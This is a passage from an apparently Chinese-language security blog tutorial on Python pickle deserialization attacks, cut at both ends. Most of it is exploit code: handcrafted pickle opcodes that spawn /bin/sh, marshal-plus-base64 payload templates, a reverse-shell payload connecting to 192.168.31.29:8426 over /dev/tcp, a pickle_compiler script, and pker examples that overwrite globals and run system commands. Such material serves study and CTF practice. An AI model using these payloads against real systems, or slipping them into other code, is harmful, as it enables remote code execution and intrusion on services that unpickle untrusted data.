&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;fib(10)=&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094914448.png" alt="image-20210809094914448">&lt;/p>
&lt;p>但也不是绝路一条，&lt;strong>Marshal&lt;/strong>可以让这段代码序列化&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;fib(10) =&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">code_serialized&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">code_serialized&lt;/span>
&lt;span style="color:#75715e"># YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在得到了序列化的字符串，我们希望它被反序列化时执行，但是直接将他放入&lt;code>__reduce__&lt;/code>返回部分似乎并不可以，&lt;code>__reduce__&lt;/code>是调用callable来执行参数之类的，而我们构造好的本身就是callable，希望它执行而不是作为另一个callable的参数；这时就需要直接从PVM操作码的层级进行构造了。&lt;/p>
&lt;p>————其实我觉得更通俗的理解是这样可以不把要执行的代码限制在&lt;code>return (os.system,(a,))&lt;/code>这样式的框架中，而是可以自由的执行代码，或者说就是另一种形式的pker&lt;/p>
&lt;p>我们需要执行的其实是（利用到python oop的特性，通过&lt;code>types.FunctionTyle(func_code,globals(),’’)()&lt;/code>来动态地创建匿名函数，参见：&lt;a href="https://docs.python.org/zh-cn/3/library/types.html#module-types">官方文档&lt;/a>）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">types&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FunctionType&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_enc&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者更可读一些&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">code_str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_enc&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_str&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">func&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">types&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FunctionType&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">func&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接下来就是手动构造opcode的时候了，回想之前返回一个简单的shell时的opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>开头的c后面跟的是引入的模块，换行之后是函数，再换行之后是执行的语句；根据这个结构把marshal和b64加进去&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cmarshal&lt;/span>
&lt;span style="color:#111">loads&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbase64&lt;/span>
&lt;span style="color:#111">b64decode&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;YwAAAAAB........&amp;#39;&lt;/span>
&lt;span style="color:#111">tRtR&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>而globals()可以在&lt;code>__builtin__&lt;/code>模块中引入&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{}{}&lt;/span>
&lt;span style="color:#111">c__builtin__&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>把上面的缝合起来得到最终的payload，注意添加&lt;code>(rR.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">ctypes&lt;/span>
&lt;span style="color:#111">FunctionType&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmarshal&lt;/span>
&lt;span style="color:#111">loads&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbase64&lt;/span>
&lt;span style="color:#111">b64decode&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;YwAAAAAB........&amp;#39;&lt;/span>
&lt;span style="color:#111">tRtRc__builtin__&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>构造这个人看着费劲的payload的模板~（来源参见：&lt;a href="https://checkoway.net/musings/pickle/">Arbitrary code execution with Python pickles&lt;/a>）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span> &lt;span style="color:#75715e"># Your code here&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;ctypes
&lt;/span>&lt;span style="color:#d88200">FunctionType
&lt;/span>&lt;span style="color:#d88200">(cmarshal
&lt;/span>&lt;span style="color:#d88200">loads
&lt;/span>&lt;span style="color:#d88200">(cbase64
&lt;/span>&lt;span style="color:#d88200">b64decode
&lt;/span>&lt;span style="color:#d88200">(S&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tRtRc__builtin__
&lt;/span>&lt;span style="color:#d88200">globals
&lt;/span>&lt;span style="color:#d88200">(tRS&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tR(tR.&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>用pickle执行一下那串payload看看效果&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094819276.png" alt="image-20210809094819276">&lt;/p>
&lt;p>成功返回了斐波那契数列的结果和一个shell&lt;/p>
&lt;p>原理都是一样的，也可以用Marshal+b64的方式反弹shell（用模板生成opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># print &amp;#39;hold on...&amp;#39;&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;ctypes
&lt;/span>&lt;span style="color:#d88200">FunctionType
&lt;/span>&lt;span style="color:#d88200">(cmarshal
&lt;/span>&lt;span style="color:#d88200">loads
&lt;/span>&lt;span style="color:#d88200">(cbase64
&lt;/span>&lt;span style="color:#d88200">b64decode
&lt;/span>&lt;span style="color:#d88200">(S&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tRtRc__builtin__
&lt;/span>&lt;span style="color:#d88200">globals
&lt;/span>&lt;span style="color:#d88200">(tRS&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tR(tR.&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810015119794.png" alt="image-20210810015119794">&lt;/p>
&lt;p>————或者下面这个模板也可以达到上面的效果（执行代码 而不包含类和函数）（来源：&lt;a href="https://gist.github.com/freddyb/3360650#file-pickle_compiler-py">pickle_compiler.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cPickle&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">ImportError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">sys&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">argv&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">picklecompiler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sourcefile&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">sourcecode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sourcefile&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;c__builtin__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">eval&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(c__builtin__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">compile&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">S&amp;#39;&amp;lt;payload&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&amp;#39;exec&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tRtR.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#111">sourcecode&lt;/span> &lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">],)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">usage&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;usage: python &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> filename&amp;#39;&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">picklecompiler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">usage&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="工具二连---通过upkeruhttpsgithubcomeddieivan01pker构造opcode">工具二连 - 通过&lt;a href="https://github.com/eddieivan01/pker">&lt;u>pker&lt;/u>&lt;/a>构造opcode&lt;/h3>
&lt;p>原理参见：&lt;a href="https://xz.aliyun.com/t/7012#toc-5">通过AST来构造Pickle opcode - 自动化构造&lt;/a>，利用了抽象语法树&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809232152276.png" alt="image-20210809232152276">&lt;/p>
&lt;p>pker会用到&lt;code>GLOBAL&lt;/code>, &lt;code>INST&lt;/code>, &lt;code>OBJ&lt;/code>这三种特殊函数和一些必要的转换方式；下面是pker的简单小栗子（更多使用说明详见上面的链接）&lt;/p>
&lt;ul>
&lt;li>
&lt;p>全局变量覆盖&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 覆盖直接由执行文件引入secret模块中的name和category模块&lt;/span>
&lt;span style="color:#111">ecret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 覆盖引入模块的变量&lt;/span>
&lt;span style="color:#111">game&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;game&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">curr_ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;123&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>函数执行&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 通过b&amp;#39;R&amp;#39;调用 __reducce__方法&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>
&lt;span style="color:#111">system&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 通过b&amp;#39;i&amp;#39;调用&lt;/span>
&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 通过b&amp;#39;c&amp;#39;和b&amp;#39;o&amp;#39;调用&lt;/span>
&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 多参数调用函数&lt;/span>
&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[module]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[callable]&amp;#39;&lt;/span>&lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#111">param0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">param1&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">])&lt;/span>
